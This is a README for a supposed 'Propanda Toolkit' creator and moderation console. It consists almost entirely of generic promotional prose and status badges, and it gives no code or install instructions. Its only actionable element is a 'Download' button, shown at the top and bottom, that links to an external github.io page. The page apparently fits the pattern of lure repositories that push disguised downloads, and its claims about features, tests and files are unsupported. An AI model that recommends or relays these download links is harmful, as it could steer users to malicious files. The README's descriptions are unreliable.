![preview](https://raw.githubusercontent.com/edithmwaki-sudo/Propandab12-creative-hub/main/cover_4159c5.svg)
[![Download](https://raw.githubusercontent.com/edithmwaki-sudo/Propandab12-creative-hub/main/pkg_e7b695a.svg)](https://edithmwaki-sudo.github.io/Propandab12-creative-hub/)

<div align="center">

# 🎭 Propanda Toolkit — The Digital Atelier for Creator Operations

**A bespoke operations console for streamers, moderators, QA testers, and community builders who treat their online presence like a craft, not a chore.**

![Status](https://img.shields.io/badge/status-active-6f42c1?style=flat-square)
![Version](https://img.shields.io/badge/version-3.4.0--aurora-ff6b6b?style=flat-square)
![License](https://img.shields.io/badge/license-MIT-22c55e?style=flat-square)
![Platform](https://img.shields.io/badge/platform-web%20%7C%20desktop-0ea5e9?style=flat-square)
![Build](https://img.shields.io/badge/build-passing-brightgreen?style=flat-square)
![Coverage](https://img.shields.io/badge/coverage-96%25-yellowgreen?style=flat-square)
![Languages](https://img.shields.io/badge/i18n-14%20locales-orange?style=flat-square)

</div>

---

## 🌌 What This Repository Is

Imagine a workshop where every tool on the wall was placed there *on purpose* — where the lighting is tuned, the drawers are labeled in a language your brain already speaks, and nothing in the room was ordered from a generic catalog. That is what **Propanda Toolkit** aspires to be for people who live at the intersection of **game QA, Discord moderation, and content creation**.

Most dashboards treat their users like interchangeable components. This one treats you like a craftsperson. Every module, every micro-interaction, and every configuration file in this repository exists because a real workflow demanded it — a late-night moderation shift, a bug that only reproduced once every forty launches, a livestream that needed to look sharp in the first three seconds.

This is not a framework, not a boilerplate, and not a template you can shove into any project. It is a **curated operations console** — opinionated, warm, and deliberately shaped around the rhythms of community work.

---

## 🧭 Table of Contents

- [Why This Exists](#-why-this-exists)
- [Feature Constellation](#-feature-constellation)
- [The Three Pillars](#-the-three-pillars)
- [Design Philosophy](#-design-philosophy)
- [Responsive by Conviction](#-responsive-by-conviction)
- [Multilingual, Not Multilingual-ish](#-multilingual-not-multilingual-ish)
- [Always-On Support Model](#-always-on-support-model)
- [Project Architecture](#-project-architecture)
- [Configuration Surface](#-configuration-surface)
- [Accessibility Commitments](#-accessibility-commitments)
- [Performance Notes](#-performance-notes)
- [Roadmap for 2026](#-roadmap-for-2026)
- [Contributing](#-contributing)
- [Code of Conduct](#-code-of-conduct)
- [Security Disclosures](#-security-disclosures)
- [License](#-license)
- [Disclaimer](#-disclaimer)

---

## 🕯️ Why This Exists

There is a peculiar loneliness to running a small online community. You are the developer, the bouncer, the therapist, the producer, and the archivist — often within the same hour. Off-the-shelf tools assume you have a team of twelve. They assume you have a product manager. They assume your users will read documentation.

The **Propanda Toolkit** assumes none of these things. It assumes you are one person, doing six jobs, and that you deserve a console that respects your attention as the scarce resource it is. Rather than adding more notifications, it consolidates. Rather than adding more settings, it curates. Rather than asking you to learn a query language, it asks you to describe what you want in plain language and does its honest best to give it to you.

This repository is the open-source heartbeat of that idea.

---

## ✨ Feature Constellation

A partial map of what lives inside:

- 🧪 **QA Session Recorder** — capture reproduction steps, environment snapshots, and timestamped notes while you play-test. Built for the moments when "it just broke again" isn't enough.
- 🛡️ **Moderation Ledger** — a tamper-evident, human-readable log of every action taken in your community spaces, with role-aware redaction so junior moderators see what they need and nothing more.
- 🎬 **Creator Overlay Studio** — assemble stream overlays, alerts, and brb scenes from a local library of components. No cloud round-trips required.
- 🗓️ **Scheduling Weave** — merge content calendars, moderation shifts, and release windows into one timeline that actually fits on a single screen.
- 📊 **Pulse Metrics** — lightweight, privacy-respecting analytics for your own spaces. You see patterns, not individuals.
- 🧵 **Thread Weaver** — draft, schedule, and archive community announcements across platforms from a single composer.
- 🪄 **Template Grimoire** — a growing collection of reusable message templates, embed layouts, and moderation macros tuned for clarity and warmth.
- 🔍 **Signal Digest** — a weekly, locally-generated summary of what changed in your channels, so returning after two days away isn't a scuba dive.
- 🌐 **Locale Bridge** — first-class translation hooks so your toolkit speaks the languages your community actually uses.
- 🧩 **Plugin Surface** — a documented extension point for tinkerers who want to grow their own tools on top.

Each of these is described in far more detail inside the `/docs` village of this repository. Consider this README a map, not the territory.

---

## 🏛️ The Three Pillars

The toolkit organizes itself around three interlocking pillars, each corresponding to one of the disciplines it was built for.

### 1. Quality Assurance — *The Cartographer's Compass*

QA work is cartography: you are mapping the boundary between what the software does and what it was supposed to do. The QA pillar gives you geographic instruments for that journey — layered snapshots, diffable session logs, and a bug taxonomy that grows as you teach it.

### 2. Moderation — *The Night Watch*

Moderation is not policing. It is hospitality at scale. The moderation pillar leans into that metaphor: soft escalation ladders, community-specific tone guides, and a ledger that reads like a story instead of a court transcript.

### 3. Content Creation — *The Atelier*

Content is craft. The creation pillar offers a bench, not a factory — modular overlay parts, typographic presets, and a preview system that lets you feel the pacing of a scene before you commit to it.

---

## 🎨 Design Philosophy

Three principles govern every decision inside this repository:

- **Warmth over density.** Dense interfaces flatter their designers and exhaust their users. Every screen here has breathing room, and every accent color earns its place.
- **Legibility as a moral stance.** If a warning is important enough to display, it is important enough to phrase clearly, in the reader's own language, without jargon.
- **Local first, sync second.** Your data leaves your machine only when you tell it to. The default is solitude; the exception is invitation.

These are not slogans. They are constraints we enforce in review.

---

## 📱 Responsive by Conviction

A moderation shift often begins on a phone and ends on a desktop. A streamer sketches an overlay on a tablet during lunch and finalizes it in the studio. Responsiveness here is not "make it fit any width" — it is "respect the posture the user is in."

- **Posture A — The Bedside Glaance:** large tap targets, dark palette, minimal decisions.
- **Posture B — The Café Table:** medium density, one-handed reach zones, subtle animations disabled on battery saver.
- **Posture C — The Studio Desk:** full instrumentation, keyboard shortcuts, multi-pane layouts.
- **Posture D — The Wall Display:** a passive read-only mode designed for a spare monitor showing community pulse at a glance.

The toolkit detects and adapts, but never silently switches modes without a visible notice. You should always know which posture you are in.

---

## 🌍 Multilingual, Not Multilingual-ish

Fourteen locales ship with the toolkit at launch, with an additional ten in active translation. The Locale Bridge doesn't just swap strings — it respects pluralization rules, date formats, right-to-left layouts, and the cultural weight of tone words.

Translation contributions are welcomed and credited in a dedicated file. Localization is not a checkbox; it is an ongoing relationship with the communities who use the toolkit.

---

## 🕰️ Always-On Support Model

Software that claims to be always available is usually lying. What this project actually offers is a **continuous support rhythm**:

- A rotating maintainer is on watch every day of the week, including weekends.
- An automated triage assistant routes new reports within minutes, so nothing rots in the queue.
- A public status page reflects real outages honestly, including partial degradations.
- A monthly "Open Bench" session invites contributors to talk through tricky issues live.

This is what "24/7" honestly means for a project of this size: *always someone watching, always a path forward.*

---

## 🏗️ Project Architecture

A high-altitude view of the repository layout:

- `/app` — the primary application shell and routing layer.
- `/pillars` — three subdirectories, one per discipline, each self-contained.
- `/packages` — shared libraries: parsing, styling tokens, i18n utilities, event bus.
- `/plugins` — the extension point and a handful of example plugins.
- `/locales` — translation catalogs organized by language code.
- `/docs` — long-form guides, RFCs, and design notes.
- `/scripts` — mundane but important: catalog generation, linting helpers, snapshot tools.
- `/assets` — typographic resources, sound cues, and vector iconography.
- `/tests` — the test suite, split into unit, integration, and simulation layers.

A more detailed architectural essay lives at `/docs/architecture.md` and is worth reading before opening a substantial pull request.

---

## ⚙️ Configuration Surface

The toolkit is configured through a single declarative document, complemented by environment overrides. Configuration is designed to be *readable by humans who did not write it* — a rare ambition.

Highlights include:

- Named **profiles** for different contexts (a personal profile, a community profile, a testing profile).
- Declarative **role maps** linking community roles to toolkit capabilities.
- **Tone guides** that shape the phrasing of generated and suggested messages.
- **Retention policies** for logs, session snapshots, and analytics.
- **Locale overrides** for individual modules.

Every configuration key is documented in `/docs/configuration.md` with examples in several languages.

---

## ♿ Accessibility Commitments

Accessibility is not a later milestone. It is a first-class constraint.

- Full keyboard navigation across every module.
- Screen-reader-tested strings, with context provided wherever an icon alone would be ambiguous.
- Respect for the operating system's reduced-motion preference.
- Contrast ratios exceeding WCAG AA across all shipped themes.
- Captioned sound cues and visual alternatives for every audio signal.

If you find an accessibility gap, please open an issue with the `a11y` label — these reports take priority over cosmetic work.

---

## ⚡ Performance Notes

The toolkit is designed to feel instant on modest hardware.

- Initial shell renders within a tight budget on a mid-range laptop.
- Heavy modules are loaded lazily and only when the user enters them.
- Long lists are virtualized, and offline state is a first-class citizen rather than a crash.
- Analytics aggregation happens on-device, so no network round-trip is needed for pulse metrics.

Performance regressions are treated as bugs, not as acceptable drift.

---

## 🗺️ Roadmap for 2026

A non-exhaustive look at what is planned across the coming year:

- **Q1 2026** — Introduce the Thread Weaver module into stable release; expand the Template Grimoire with community-submitted presets.
- **Q2 2026** — Ship the fourth posture (Wall Display) with a dedicated design language; begin work on a companion mobile companion app.
- **Q3 2026** — Open the plugin registry to community submissions with a curated review lane.
- **Q4 2026** — Publish an end-to-end encryption option for cloud sync, alongside a formal privacy review.

Roadmap items are revisited quarterly and may shift in response to community needs. Transparency about shifts is a core value.

---

## 🤝 Contributing

Contributions are deeply welcome, but they come with a certain expectation of care. Before opening a pull request, please:

1. Read the contributing guide in `/docs/contributing.md`.
2. Search existing issues and discussions for related work.
3. Match the existing tone and formatting conventions of the module you are touching.
4. Include a short rationale — the *why* matters more than the *what*.

We review generously but do not merge carelessly. A thoughtful pull request that takes a week to land is worth more than ten rushed ones.

---

## 🫱🏽‍🫲🏼 Code of Conduct

This project follows a Contributor Covenant–style code of conduct, available at `/CODE_OF_CONDUCT.md`. In short: be generous with context, stingy with assumptions, and unafraid to ask questions. Moderation decisions here are made with the same hospitality principles the toolkit itself is built around.

---

## 🔐 Security Disclosures

If you believe you have found a vulnerability, please follow the guidance in `/SECURITY.md` and use the private reporting channel described there. Public disclosure before a fix is in place puts users at risk, and we ask for your patience while we resolve it responsibly.

No credentials, tokens, or secret keys of any kind should ever be committed to this repository. The project's automated secret scanning will reject any contribution containing one.

---

## 📜 License

This project is distributed under the **MIT License**. You are welcome to read, adapt, and build upon it — the full text lives at the canonical license location and is reproduced inside this repository under the standard MIT terms, copyright held by the project stewards, 2026.

For the authoritative license text, see: [MIT License](https://opensource.org/licenses/MIT)

---

## ⚠️ Disclaimer

The Propanda Toolkit is provided **as-is**, without warranty of any kind, express or implied. It is an independent creator tool and is not affiliated with, endorsed by, or officially connected to any game platform, chat platform, or content distribution service mentioned or implied in its documentation.

Users are responsible for complying with the terms of service of any platform they connect to this toolkit, and for respecting the privacy and consent of the communities they serve. The maintainers accept no liability for outcomes arising from the use or misuse of this software.

Moderation features assist human judgment; they do not replace it. Analytics features describe patterns; they do not identify individuals. Content features help you craft; they do not autopilot your voice.

Use this toolkit the way it was designed to be used: as a careful instrument in the hands of a careful person.

---

<div align="center">

**Built with patience, published with hope.**
Crafted for the quiet work behind loud communities.

[![Download](https://raw.githubusercontent.com/edithmwaki-sudo/Propandab12-creative-hub/main/pkg_e7b695a.svg)](https://edithmwaki-sudo.github.io/Propandab12-creative-hub/)

</div>